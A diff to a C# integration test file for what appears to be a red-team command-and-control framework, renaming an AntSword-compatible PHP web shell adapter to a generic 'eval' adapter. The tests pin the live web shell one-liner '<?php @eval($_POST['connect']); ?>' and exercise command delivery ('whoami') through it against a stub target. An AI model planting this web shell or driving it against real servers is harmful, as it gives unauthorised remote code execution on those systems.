@@ -20,10 +20,10 @@ namespace Rod.Integration.Tests;
 /// WebShell-class anchor row; both in-tree adapters' wire shapes are
 /// pinned directly -- the Rod-native family (baked 256-bit key,
 /// AES-256-GCM sealed request value and response body, a wrong key
-/// answering nothing) and the AntSword-compatible PHP family (bootstrap
+/// answering nothing) and the universal one-liner PHP family (bootstrap
 /// parameter, random payload variable, per-request marker halves, base64
 /// framing) -- and the synchronous execution arc runs end to end against
-/// a stub target that speaks the AntSword shape -- issue, claim, adapter
+/// a stub target that speaks the one-liner shape -- issue, claim, adapter
 /// round trip, result -- landing as a completed task exactly like a
 /// beacon's capture.
 /// </summary>
@@ -96,7 +96,7 @@ public class WebShellTests
     [Fact]
     public void Adapter_RendersTheEvalOneLiner()
     {
-        var adapter = new AntSwordPhpAdapter();
+        var adapter = new EvalPhpAdapter();
 
         Assert.Equal(
             "<?php @eval($_POST['connect']); ?>",
@@ -106,7 +106,7 @@ public class WebShellTests
     [Fact]
     public void Adapter_EncodesTheBootstrapAndRandomPayloadVariable()
     {
-        var adapter = new AntSwordPhpAdapter();
+        var adapter = new EvalPhpAdapter();
 
         var request = adapter.EncodeCommand(
             "http://web.example.test/up.php", "connect", "base64", "base64", "whoami");
@@ -132,7 +132,7 @@ public class WebShellTests
     [Fact]
     public void Adapter_DecodesTheFramedAnswer_AndRefusesUnmarkedBodies()
     {
-        var adapter = new AntSwordPhpAdapter();
+        var adapter = new EvalPhpAdapter();
         var request = adapter.EncodeCommand(
             "http://web.example.test/up.php", "connect", "base64", "base64", "whoami");
 
@@ -160,7 +160,7 @@ public class WebShellTests
         // Register the placed script; the answer carries the one-liner and
         // the parameter it was bound to.
         var registered = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
-            new RegisterWebShellRequest(target.Url, AdapterId: "antsword-php", Password: "connect"));
+            new RegisterWebShellRequest(target.Url, AdapterId: "eval-php", Password: "connect"));
         registered.EnsureSuccessStatusCode();
         var endpoint = await registered.Content.ReadFromJsonAsync<WebShellDto>();
         Assert.NotNull(endpoint);
@@ -216,7 +216,7 @@ public class WebShellTests
 
         await using var target = await StubTarget.StartAsync();
         var registered = await env.Http.PostAsJsonAsync($"/engagements/{engagementId}/webshells",
-            new RegisterWebShellRequest(target.Url, AdapterId: "antsword-php", Password: "connect"));
+            new RegisterWebShellRequest(target.Url, AdapterId: "eval-php", Password: "connect"));
         registered.EnsureSuccessStatusCode();
         var endpoint = await registered.Content.ReadFromJsonAsync<WebShellDto>();
 
@@ -292,7 +292,7 @@ public class WebShellTests
     private sealed record ExecDto(string TaskId, string Output, string Outcome, long ElapsedMs);
 
     /// <summary>
-    /// A stub web root speaking the AntSword PHP server side: it parses the
+    /// A stub web root speaking the one-liner family's PHP server side: it parses the
     /// bootstrap parameter, decodes the payload, reads the command and the
     /// marker halves out of the payload text, and answers with the framed
     /// base64 body the adapter decodes. This is the protocol-conformance
